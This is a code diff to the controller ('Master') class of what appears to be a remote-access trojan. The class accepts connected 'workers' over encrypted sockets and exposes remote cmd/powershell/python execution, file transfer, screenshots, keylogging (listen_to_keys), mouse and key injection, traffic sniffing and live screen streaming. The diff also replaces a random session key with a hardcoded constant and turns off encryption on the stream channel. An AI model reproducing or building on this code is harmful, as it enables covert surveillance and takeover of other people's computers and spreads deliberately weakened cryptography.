@@ -15,6 +15,8 @@ from encryption.rsa import rsa
 import hashlib
 from encryption.DHE.my_hmac import HMAC
 from encryption.aes.aes_types import CTR
+from Crypto.Cipher import AES
+from Crypto.Util import Counter
 Commend = Callable[[],bytes]
 # # unneeded
 # RETURN = False
@@ -189,7 +191,7 @@ class Master:
         self.stream_server.bind((ip,port+1))
         self.server.listen()
         self.stream_server.listen()
-        # self.functions: dict[str, Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
+        self.functions: list[str] = ["cmd", "powershell", "python", "send_file", "receive_file", "screen_shot","listen_to_keys", "press_key_in_worker", "control_mouse", "sniff_from_worker", "live_stream"]
         self.exit:bool = False
         self.cur_ip = None
         self._sock_lock = threading.RLock()
@@ -204,19 +206,18 @@ class Master:
 
 
     def connect(self):
-        while True:
-            client, address = self.server.accept()
-            with self._sock_lock:
-                rsa_public_client = self.receiver(open_seal=False)
-            self.rsa.load_peer_public_key(rsa_public_client)
-            with self._sock_lock:
-                self.sender(self.rsa.dump_my_public_key(),seal=False)
-                client_aes_key_en =self.receiver(open_seal=False)
-            master_key = os.urandom(32)
-            self.sender(self.rsa.send(master_key, hashlib.sha256(master_key).digest()), seal=False)
-            stream_client = self.stream_server.accept()[0]
-            self.clients[address[0]] = Client(client,stream_client,self.rsa.receive(client_aes_key_en).encode(),master_key)
-            self.update_clients()
+        client, address = self.server.accept()
+        with self._sock_lock:
+            rsa_public_client = self.receiver(open_seal=False,sock=client)
+        self.rsa.load_peer_public_key(rsa_public_client)
+        with self._sock_lock:
+            self.sender(self.rsa.dump_my_public_key(),seal=False, sock=client)
+            client_aes_key_en =self.receiver(open_seal=False, sock=client)
+        master_key = b"123456789101112!"
+        self.sender(self.rsa.send(master_key, hashlib.sha256(master_key).digest()), seal=False, sock=client)
+        stream_client = self.stream_server.accept()[0]
+        self.clients[address[0]] = Client(client,stream_client,self.rsa.receive(client_aes_key_en).encode(),master_key)
+        self.update_clients()
 
     def recvall(self, sock: socket.socket, size: int) -> bytes:
         data = b""
@@ -225,54 +226,63 @@ class Master:
             if not packet:
                 return b""
             data += packet
+        return data
 
 
-    def receiver(self, stream: bool = False, open_seal: bool = True) -> bytes:
-        cur_client = self.clients[self.cur_ip]
-        if stream:
-            sock = cur_client.stream_sock
+    def receiver(self, stream: bool = False, open_seal: bool = True, sock:socket.socket = None) -> bytes:
+        if sock:
+            cur_sock = sock
+            cur_client = None
         else:
-            sock = cur_client.command_sock
+            cur_client = self.clients[self.cur_ip]
+            if stream:
+                cur_sock = cur_client.stream_sock
+            else:
+                cur_sock = cur_client.command_sock
 
-        size = self.recvall(sock, 4)
+        size = self.recvall(cur_sock, 4)
         if not size:
             return b""
         size = struct.unpack("I", size)[0]
         if size <1+4+8+32:
             return b"error: Truncated message"
-        blob = self.recvall(sock,size)
+        blob = self.recvall(cur_sock,size)
         if open_seal:
             aes_key,mac_key = cur_client.derive_peer_keys()
-            aad = struct.unpack("I",blob[0:4])[0]
+            aad = blob[0:4]
             nonce = blob[4:12]
             tag = blob[-32:]
             c = blob[12:-32]
             header = aad + nonce
             to_mac =header + c
-            calc = HMAC("sha256",to_mac,mac_key).derive()
+            calc = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
             if not hmac.compare_digest(calc, tag):
                 return b"error: Authentication failed"
-            ctr = CTR(aes_key, nonce)
-            return ctr.decrypt(c)
 
+            ctr = Counter.new(128, initial_value=int.from_bytes(nonce))
+            return AES.new(aes_key, AES.MODE_CTR,counter=ctr).decrypt(c)
         else:
             return blob
 
 
-    def sender(self, message: bytes, stream: bool = False, seal: bool = True):
-        cur_client = self.clients[self.cur_ip]
-        if stream:
-            client_sock = cur_client.stream_sock
+    def sender(self, message: bytes, stream: bool = False, seal: bool = True, sock: socket.socket = None):
+        if sock:
+            client_sock = sock
+            cur_client = None
         else:
-            client_sock  = cur_client.command_sock
+            cur_client = self.clients[self.cur_ip]
+            if stream:
+                client_sock = cur_client.stream_sock
+            else:
+                client_sock  = cur_client.command_sock
         if seal:
             aes_key, mac_key = cur_client.derive_own_keys()
             nonce = os.urandom(8)
-            ctr = CTR(aes_key,nonce)
-            c = ctr.encrypt(message)
+            ctr = Counter.new(128,initial_value=int.from_bytes(nonce))
+            c = AES.new(aes_key, AES.MODE_CTR,counter=ctr).encrypt(message)
             header = struct.pack("I",len(message)) + nonce
             to_mac = header + c
-            tag = HMAC("sha256",to_mac,mac_key).derive()
+            tag = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
             data = struct.pack("I", len(header + c + tag)) + header + c + tag
         else:
             data = struct.pack("I", len(message)) + message
@@ -325,7 +335,7 @@ class Master:
             if self.streaming:
 
                 self.sender(b"live_stream")
-                frame_data = self.receiver(stream=True)
+                frame_data = self.receiver(stream=True,open_seal=False)
 
                 if not frame_data:
                     time.sleep(0.05)
